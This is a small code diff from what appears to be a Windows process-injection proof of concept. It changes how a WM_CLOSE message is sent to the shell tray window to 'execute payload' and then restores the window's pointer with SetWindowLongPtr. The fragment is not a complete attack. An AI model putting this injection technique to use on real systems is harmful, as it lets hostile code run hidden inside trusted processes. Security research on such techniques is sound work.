@@ -98,14 +98,7 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    if (!PostMessageA(shellTrayWindowHandle, WM_CLOSE, 0, 0))
-    {
-        printf("[Error] %d - Failed to PostMessage to execute payload\n", GetLastError());
-        return 1;
-    }
-
-    // there is no easy way to wait for PostMessage to be processed so we just wait 1 second
-    Sleep(1000);
+    SendMessageA(shellTrayWindowHandle, WM_CLOSE, 0, 0);
 
     if (!SetWindowLongPtr(shellTrayWindowHandle, 0, cTrayPointer))
     {
